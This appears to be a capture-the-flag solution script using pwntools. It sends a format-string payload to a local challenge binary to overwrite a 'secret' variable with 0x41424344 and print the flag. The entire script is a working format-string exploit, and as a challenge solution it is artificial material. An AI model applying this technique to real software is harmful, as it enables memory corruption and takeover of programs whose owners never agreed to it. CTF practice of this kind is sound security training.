#!/usr/bin/env python3
from pwn import *
import re
chal = "./chal"
secret_value = 0x41424344
context.arch = 'amd64'
context.log_level = 'debug'
elf = ELF(chal)

# We previously determined that offset 6 is correct.
offset = 6
payload = fmtstr_payload(offset, {elf.symbols['secret']: secret_value}, write_size='short')

io = process(chal)
io.sendline(payload)
pattern = r'GrizzCTF\{.*?\}'
io.recvuntil(b'your flag: ')
flag = io.recvline().strip().decode()
io.close()
log.info(f"Flag found: {flag}")

